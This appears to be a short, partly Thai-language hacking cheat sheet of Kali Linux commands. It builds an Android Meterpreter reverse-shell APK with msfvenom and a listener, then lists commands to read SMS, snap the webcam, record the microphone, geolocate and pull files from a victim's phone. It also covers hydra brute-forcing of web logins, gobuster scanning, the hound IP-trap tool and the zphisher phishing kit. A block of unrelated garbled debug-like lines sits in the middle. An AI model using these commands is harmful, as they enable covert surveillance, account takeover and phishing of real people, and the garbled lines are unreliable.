![SLUR](https://unaaldia.hispasec.com/wp-content/uploads/2017/07/41da7-2.png)

# kali linux
# trap IP

Sudo su 

git clone https://github.com/techchipnet/hound 

cd hound 

bash hound.sh

# App virus Android

sudo su

msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o evil.apk

msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST YOUR_IP

set LPORT 4444

exploit

cd /storage/emulated/0/DCIM/Camera

ls

download YourPngName.png

คำสั่งพื้นฐาน
1. vibrate สั่นเครื่อง
2. screenshot แคปหน้าจอ
3. dump_sms ดูข้อมูล sms
4. send_sms -d เบอร์ -t ข้อความ    ส่งข้อความ sms
5. webcam_snap ถ่ายภาพ
6. download * เพื่อโหลดไฟล์ทั้งหมด
7. geolocate ดึงตำแหน่ง gps
8. app_list แสดงรายชื่อแอพทั้งหมด
9.app_run com.ชื่อแอพ  รันแอพ
10.record_mic -d 10   อัดเสียงไมโครโฟน 10 วิ
11.shell เข้าสู่ android shell สามารถป้อนคำสั่งต่างๆได้อิสระ ลบ system,ลบ แอพ,ลบภาพ,ตั้งรหัส,อื่นๆ



//: DDmc di 00001855438 lub OoO 59d8.acc:  *00007ff742457b95 / 0x0107b95: 00 != 4e

//: DDmc di 0000240u604 lud OoO 59d8.acc:  *00007ff742350000-00007ff742350fff 0x0002/0x0080 0x1000000

//: DDmc di 0000143g294 lud OoO 59d8.acc:  *000000007ffe9000-000000007ffe9fff 0x0002/0x0002 0x0020000

//: DDmc di 0000




# hydra

คำสั่ง

sudo apt install gobuster -y

sudo apt install seclists -y

sudo apt install hydra -y

gobuster dir -u ลิ้งเว็บ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -t 50

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt http-post-form://ลิ้งหน้าล็อกอิน:"username=^USER^&password=^PASS^":"F=Invalid"


# Phishing

sudo su
git clone --depth=1 https://github.com/htr-tech/zphisher.git

$ cd zphisher
$ bash zphisher.sh

$ pkg install tur-repo
$ pkg install zphisher
$ zphisher

Dockerfile

FROM alpine:latest
LABEL MAINTAINER="https://github.com/htr-tech/zphisher"
WORKDIR /zphisher/
ADD . /zphisher
RUN apk add --no-cache bash ncurses curl unzip wget php 
CMD "./zphisher.sh"
